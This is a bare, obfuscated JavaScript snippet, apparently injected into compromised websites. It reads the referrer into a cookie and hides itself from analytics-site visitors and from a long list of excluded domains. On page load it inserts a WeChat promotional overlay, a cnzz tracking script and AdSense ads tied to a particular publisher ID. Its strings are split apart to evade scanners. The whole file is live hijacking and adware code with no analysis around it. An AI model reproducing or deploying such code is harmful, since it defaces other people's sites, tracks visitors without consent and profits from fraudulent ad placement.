<!--
function tmpCK(n,v,s){
	if(v){
		var t1=new Date();t1.setTime(t1.getTime()+(s*1000));
		document.cookie = n+"="+escape(v)+";expires="+t1.toGMTString()+";path=/;";
	}else{
		var a1=document.cookie.split("; ");
		for(var i=0;i<a1.length;i++){var a2=a1[i].split("=");if(a2[0]==n){v=a2[1];}}
	}
	return v;
}
function tmpCheckRef(s){
	var a="&pn=0|tongji.baidu.com|umeng.com|chinaz.com|aizhan.com|51.la".split("|");
	for(i=0;i<a.length;i++){
		if(s.indexOf(a[i])!=-1){
			return false;
		}
	}
	return true;
}
function tmpPass(s){
	var a="shjfjx.cn|baobaophoto.com".split("|");
	for(i=0;i<a.length;i++){
		if(s.indexOf(a[i])!=-1){
			return false;
		}
	}
	return true;
}
function tmpCheckGG(s){
	var a="210.35.32.5|561365.com|61.150.112.62|aoyouvpn165.com|aoyouvpn173.com|bssgnu.cn|cfpawd.cn|cjwvkk.cn|ckdszq.cn|dingxue.l76.goodnic.net|gxszk.net|hoypyr.cn|jdbot.net|juyantang.cn|luoyangnanke.com|m.daxuehua.com|meinvxiezhen.eeeex.com|mmsbvq.cn|mqvchw.cn|mxoueg.cn|obeacz.cn|oshoxw.cn|shitou.cloud37.49host.com|wlwlbo.cn|wwohan.cn|www.561365.com|www.750v.com|www.915fu.com|www.anzhuo.me|www.bailubf.com|www.bzt.cn.com|www.cqzs100.com|www.daxuehua.com|www.dgtvad.com|www.diannaowang.net|www.fxisjl.cn|www.gdrelx.com|www.gzdic.cn|www.hxffbw.com|www.jdbot.net|www.jianjian.org|www.juyantang.cn|www.jvhao.com|www.jzsports.cn|www.leimost.com|www.lelers.com|www.mitalit.com|www.mxgzt.com|www.nuoruima.com|www.scyakeli.com|www.sh-yaoxing.com|www.shenbar.com|www.shxdre.com|www.ustb-mba.com|www.whcfht.com|www.xjj01.com|www.ylhasd.com|www.youyuzheng120.com|www.zhainancili.net|www.zhihgk.com|www.zlfour.cn|www.zwecun.cn|www.zzwk.cn|xjj01.com|yuemei120.com|zqfsyl.cn|zrhagw.cn|zrqfdn.cn|001gm.net|kuadmin.cn|ylhasd.com|haiqiaoshiji.com|nsbdjssy.com|kafuter.cn|rmzt.com|ttzqnews.com|fangshifu.com|janlea.com|qxgs.cn|brand.worldkids.com.cn|sdyyyz.net|ychsyxx.com|sqnsbd.cn|fsbhsyxx.com|lgzkck.com|ccinchina.com|cnwhkc.com|yznsbd.com|lzhdcy.com|dongfangrilong.com|janlea.com.cn|hansbd.cn|xinxiancai.com|zgks123.com|gxmsyfx.com|dxd.cn|serverall.com.cn|rcet.cn|m.hqx666.com|jzzxzg.com|jsnsbd.cn|hongyuanjianshe.com|jjghsjy.com|zixun.worldkids.com.cn|jsnsbd.com|wap.reprc.com|gorsun.com|sewhy.com|xin-lian.cn|xingyuntuofu.com|allcoolmen.com|zrsh100.com|dhbly.com|zzdingsheng.net|0592jhy.com|51zxwd.com|gxgjgf.com|jsjzcks.com|pdsby.com|4g.xadcfk.com|mm.allcoolmen.com|szrcm.com|m.ylhasd.com|bankxc.cn|henanart.com|obolee.com.cn|remotcon.net|shenerkj.cn|xadcfk.com|jxlakeside.com|pc.cqddgc.cn|hebeipet.com|hnfejx.com|hngd99.com|jiaransheng.com|zhanhui.worldkids.com.cn|zhaoshang.worldkids.com.cn|asia.eeeex.com|m.idianzheng.com|bio-redwood.com|byguan.com|ccsytz.com|gsym.com|m88888888.com|zhuxuecai.com|haoyijia88.com|hushi.zgks123.com|sn.dxd.cn|chinaquannao.com|dyssw.com|nyxgl.com|szlove.com|worldkids.com.cn|feidongman.com|diqiushijie.com|caibocn.com|qdhswj.com|saglee.com.cn|wysxbqx.com|.edu.cn|.gov.cn|bjfynjk.com|fanyiyuanlin.com|fanyi-design.net|cqqlxh.com|cscec2bzcb.com.cn|msheying.com|shadou.net|znzkck.com|caea.org.cn".split("|");
	for(i=0;i<a.length;i++){
		if(s.indexOf(a[i])!=-1){
			return false;
		}
	}
	return true;
}
if(typeof(tmpRef)=="undefined"){
	var tmpBody=document.body;
	var tmpHost=window.location.host.replace("www.","");
	var tmpRef=tmpCK('re'+'f')?tmpCK('re'+'f'):tmpCK('re'+'f',document.referrer,9999);
	if(tmpRef&&tmpPass(tmpHost)){
		var tmpHead=document.getElementsByTagName("head")[0];
		var tmpWX='y'+'x7'+'1y'+'x';var tmpText=unescape("%u60A8%u53EF%u4EE5%u6DFB%u52A0%u201C%23wx%23%u201D%u5FAE%u4FE1%u53F7%uFF0C%u54A8%u8BE2%u201C%23tt%23%u201D...").replace("#wx#",tmpWX).replace("#tt#","\u7535\u5f71\u002f\u8fde\u7eed\u5267\u002f\u97f3\u4e50\u002f\u6587\u6863\u002f\u4f18\u60e0\u5377");
		if(tmpRef.indexOf(tmpHost)==-1&&tmpCheckRef(tmpRef)){
			if(!tmpCK('rw'+'x')){
				var tmpDiv=document.createElement('di'+'v');
				tmpDiv.innerHTML='<d'+'iv st'+'yle="posi'+'tion:fi'+'xed;le'+'ft:5'+'0%;bot'+'tom:0;z-ind'+'ex:21474'+'83648;_posi'+'tion:abso'+'lute;mar'+'gin-le'+'ft:-15'+'0px;wid'+'th:3'+'00px;hei'+'ght:3'+'40px;ba'+'ckgro'+'und:u'+'rl(htt'+'p:/'+'/st'+'at'+'ic.5'+'2z'+'zy'+'x.co'+'m/ima'+'ges/j'+'s/ba'+'ck.p'+'ng) no-re'+'pe'+'at;"><'+'a hr'+'ef="ja'+'vascr'+'ipt:'+';" tit'+'le="clo'+'se" oncl'+'ick="th'+'is.parentNo'+'de.parentNo'+'de.removeCh'+'ild(th'+'is.parentNo'+'de)" st'+'yle="posi'+'tion:abso'+'lute;to'+'p:0;ri'+'ght:0;z-ind'+'ex:21474'+'83649;disp'+'lay:blo'+'ck;wid'+'th:5'+'0px;hei'+'ght:4'+'0px;"></'+'a><d'+'iv style="posi'+'tion:ab'+'solu'+'te;to'+'p:5'+'0px;le'+'ft:2'+'0px;wid'+'th:25'+'6px;hei'+'ght:au'+'to;col'+'or:#f'+'ff;fo'+'nt-si'+'ze:1'+'4px;li'+'ne-he'+'ig'+'ht:2'+'6px;te'+'xt-in'+'dent:2'+'4px;fo'+'nt-fam'+'ily:S'+'imH'+'ei;">'+unescape(tmpText)+'<i'+'mg st'+'yle="disp'+'lay:bl'+'ock;mar'+'gin:0 au'+'to;wid'+'th:5'+'0%;" src="htt'+'p:/'+'/st'+'at'+'ic.5'+'2z'+'zy'+'x.co'+'m/ima'+'ges/j'+'s/2w'+'m.p'+'ng" onm'+'ouseo'+'ver="th'+'is.st'+'yle.wi'+'dth=nu'+'ll" /></d'+'iv></d'+'iv>';
				tmpBody.insertBefore(tmpDiv,tmpBody.firstChild);tmpCK('rw'+'x','1',9999);
			}
			var tmpMeta = document.createElement('me'+'ta');
			tmpMeta.name = 'vi'+'ewpo'+'rt';
			tmpMeta.content = 'wid'+'th=de'+'vice-wid'+'th,init'+'ial-sca'+'le=1'+'.0,ma'+'xim'+'um-sc'+'ale=1'+'.0,us'+'er-sc'+'alab'+'le=n'+'o';
			tmpHead.appendChild(tmpMeta);
			var tmpJs = document.createElement('scr'+'ipt');
			tmpJs.src = 'htt'+'ps:/'+'/v'+'1.cn'+'zz.co'+'m/z_st'+'at.ph'+'p?i'+'d=590'+'4975&web_i'+'d=590'+'4975';
			tmpHead.appendChild(tmpJs);
			if(tmpCheckGG(tmpHost)){
				var ggDiv=document.createElement('di'+'v');
				ggDiv.innerHTML='<d'+'iv st'+'yle="posi'+'tion:fi'+'xed;t'+'op:0;le'+'ft:0;z-ind'+'ex:21474'+'83648;_posi'+'tion:abso'+'lute;wid'+'th:10'+'0%;te'+'xt-al'+'ign:cen'+'ter;"><'+'a hr'+'ef="ja'+'vascr'+'ipt:'+';" tit'+'le="clo'+'se" oncl'+'ick="th'+'is.parentNo'+'de.parentNo'+'de.parentNo'+'de.removeCh'+'ild(th'+'is.parentNo'+'de.parentNo'+'de)" st'+'yle="posi'+'tion:abso'+'lute;to'+'p:0;ri'+'ght:0;z-ind'+'ex:21474'+'83649;disp'+'lay:blo'+'ck;wid'+'th:5'+'0px;hei'+'ght:2'+'0px;co'+'lor:#f6'+'6;ba'+'ckgro'+'und:#f'+'ff;">\u5173\u95ed</'+'a><i'+'ns cl'+'ass="a'+'dsbygo'+'ogle" st'+'yle="di'+'spl'+'ay:blo'+'ck;te'+'xt-al'+'ign:ri'+'ght;" da'+'ta-a'+'d-clie'+'nt="c'+'a-p'+'ub-17'+'3290'+'9096'+'4949'+'93" da'+'ta-a'+'d-sl'+'ot="272'+'8648'+'043" da'+'ta-a'+'d-fo'+'rmat="au'+'to"></i'+'ns></d'+'iv>';
				tmpBody.insertBefore(ggDiv,tmpBody.firstChild);
				var ggJs = document.createElement('scr'+'ipt');
				ggJs.type = 'text/javascript';
				ggJs.async = true;
				ggJs.src = '//pag'+'ea'+'d2.go'+'ogles'+'yndicati'+'on.c'+'om/pa'+'gea'+'d/j'+'s/a'+'dsbygo'+'ogle.j'+'s';
				tmpHead.appendChild(ggJs);
				ggJs.onload=ggJs.onreadystatechange=function(){
					if(!this.readyState||this.readyState=='loaded'||this.readyState=='complete'){
						ggDiv.style.height="9"+"0p"+"x";
						(adsbygoogle = window.adsbygoogle || []).push({});
					}
					ggJs.onload=ggJs.onreadystatechange=null;
				}
			}
		}
	}
}
-->